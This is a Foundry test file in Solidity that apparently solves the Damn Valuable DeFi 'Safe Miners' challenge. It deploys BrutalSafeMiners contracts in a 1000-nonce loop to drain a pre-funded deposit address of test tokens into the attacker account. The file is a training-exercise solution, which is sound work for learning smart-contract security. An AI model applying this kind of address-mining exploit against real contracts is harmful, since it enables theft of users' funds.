// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {BrutalSafeMiners} from "../../../src/Contracts/safe-miners/BrutalSafeMiners.sol";

contract SafeMiners is Test {
    uint256 internal constant DEPOSIT_TOKEN_AMOUNT = 2_000_042e18;
    address internal constant DEPOSIT_ADDRESS =
        0x79658d35aB5c38B6b988C23D02e0410A380B8D5c;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    BrutalSafeMiners internal brutalsafeminers;
    address payable internal attacker;
    address internal deployer;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        deployer = users[0];
        attacker = users[1];
        vm.label(attacker, "Attacker");
        vm.label(deployer, "Deployer");

        // Deploy Damn Valuable Token contract
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deposit the DVT tokens to the address
        dvt.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertEq(dvt.balanceOf(attacker), 0);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        //
        for (uint256 nonce = 0; nonce < 1000; nonce++) {
            vm.prank(deployer);
            brutalsafeminers = new BrutalSafeMiners(attacker, dvt, 1000);
            vm.prank(attacker);
            brutalsafeminers = new BrutalSafeMiners(attacker, dvt, 1000);
        }

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        assertEq(dvt.balanceOf(DEPOSIT_ADDRESS), 0);
        assertEq(dvt.balanceOf(attacker), DEPOSIT_TOKEN_AMOUNT);
    }
}
